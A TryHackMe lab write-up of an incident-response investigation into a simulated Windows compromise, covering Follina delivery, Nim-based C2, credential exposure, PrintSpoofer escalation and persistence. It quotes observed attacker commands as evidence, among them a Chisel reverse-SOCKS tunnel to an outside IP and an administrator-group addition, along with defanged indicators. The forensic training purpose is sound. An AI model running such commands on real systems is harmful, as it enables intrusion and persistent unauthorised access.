# Tempest — Investigating a Windows Compromise

**Platform:** TryHackMe | **Focus:** Incident response, endpoint analysis and network forensics  
**Tools:** Sysmon, Windows Event Logs, EvtxECmd, Timeline Explorer, Wireshark, Brim and CyberChef

## Overview

In this lab, I reconstructed a Windows attack from a malicious document through command and control (C2), internal reconnaissance, credential exposure, privilege escalation and persistence.

I correlated process creation, DNS queries, network connections and Windows security events to explain what happened and distinguish failed attempts from successful actions.

## Evidence and approach

The investigation used `sysmon.evtx`, `windows.evtx` and `capture.pcapng`. I converted the Sysmon evidence to CSV with EvtxECmd and examined it in Timeline Explorer. Wireshark and Brim provided the network view, while CyberChef helped decode Base64 content.

| Evidence | What I used it to establish |
| --- | --- |
| Sysmon Event ID 1 | Executables, command lines, parent processes and file hashes |
| Sysmon Event ID 3 | Network destinations and ports associated with processes |
| Sysmon Event ID 22 | DNS queries and resolved addresses |
| Windows Security Event ID 4720 | Successful account creation |
| Windows Security Event ID 4732 | Addition of an account to a local security group |
| HTTP traffic | Payload retrieval, C2 polling and encoded command results |

## Key findings

### Initial access and payload delivery

The malicious document, `free_magicules.doc`, was associated with a Follina exploitation chain involving `ms-msdt:` and PowerShell. The document fetched content from:

```text
hxxp://phishteam[.]xyz/02dcf07/index.html
```

The chain downloaded an archive into the user's Startup directory and left `update.lnk` there. A subsequent PowerShell command used `certutil` to download and execute `first.exe` from `C:\Users\Public\Downloads`.

### Command and control

The stage 2 payload contacted `resolvecyber[.]xyz`, resolving to `167.71.222.162`, over HTTP port **80**.

The C2 used **GET** requests to `/9ab62b5`. Base64-encoded command results were sent in the **q** query parameter. The user agent, `Nim httpclient/1.6.6`, provided an additional clue about the client's implementation.

Decoding the traffic revealed reconnaissance commands such as `whoami`, `net users`, `net localgroup administrators` and directory listings.

### Credential exposure and access to internal services

The attacker read `C:\Users\benimaru\Desktop\automation.ps1`, which contained plaintext credentials. Port enumeration also revealed a listener on **5985**, consistent with WinRM.

The attacker downloaded a binary renamed to `ch.exe` and established a reverse SOCKS proxy:

```text
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

Hash-based identification linked this binary to **Chisel**. After its execution at **17:18:48 UTC**, a `wsmprovhost.exe` process appeared at **17:19:06 UTC**, supporting the use of WinRM for remote access.

### Privilege escalation

At **17:19:16 UTC**, the attacker executed `whoami /priv`. At **17:20:06 UTC**, PowerShell downloaded `spf.exe`.

Its SHA256 identified it as **PrintSpoofer**, which abuses **SeImpersonatePrivilege**. The attacker then launched it with `C:\ProgramData\final.exe`. The child process ran as **NT AUTHORITY\SYSTEM**, providing evidence of successful privilege escalation.

The new C2 binary communicated over port **8080**.

### Persistence and administrative access

The attacker created the accounts **shuna** and **shion**. Earlier attempts omitted `/add` and failed; Windows Security Event ID **4720** provided confirmation of account creation.

The command below added `shion` to the local Administrators group:

```text
net localgroup administrators /add shion
```

Event ID **4732** records this type of group membership change. A subsequent group listing included `shion`.

The attacker also configured service-based persistence using `sc.exe`, a service named **TempestUpdate2**, `C:\ProgramData\final.exe` as the binary path, and automatic startup. A separate attempt to create **TempestUpdate** returned error **1073** because that service already existed; I treated that result as a failed attempt rather than proof of creation.

## Selected file indicators

| Observed binary | Identified tool | SHA256 |
| --- | --- | --- |
| `ch.exe` | Chisel | `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451` |
| `spf.exe` | PrintSpoofer | `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D` |

Network indicators above are defanged and come from the lab evidence.

## What I learned

- Use timestamps and parent-child relationships to connect individual events into an attack timeline.
- Match a file hash to the executable in the **Image** field, rather than accidentally reporting the downloader's hash.
- Decode C2 traffic to recover both attacker commands and their results.
- Distinguish a command being attempted from its successful completion.
- Correlate network evidence with endpoint and Windows security logs before drawing conclusions.

*Completed in an authorised TryHackMe training environment. This write-up summarises my investigation and learning.*

